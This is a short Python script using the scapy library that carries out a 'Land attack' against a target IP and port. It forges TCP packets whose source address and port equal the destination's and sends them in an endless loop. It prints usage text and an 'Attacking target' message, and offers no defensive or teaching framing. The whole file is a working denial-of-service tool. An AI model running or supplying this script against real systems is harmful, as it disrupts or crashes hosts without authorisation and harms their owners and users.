#!/usr/bin/env python
import sys
from scapy.all import *

total = len(sys.argv)
if total != 3:
  print("Performs Land attack from Kali Linux")
  print(" ")
  print("Usage: ./land TARGET-IP TARGET-PORT")
 
target=str(sys.argv[1])
port=int(sys.argv[2])

print('Attacking target ' + target + ' on port ' + str(port))

  
i=IP()
i.dst=target
i.src=target

t=TCP()
t.dport=port
t.sport=port

sent = 0
while True:
    send(i/t, loop=1, verbose=0)
print("Done!")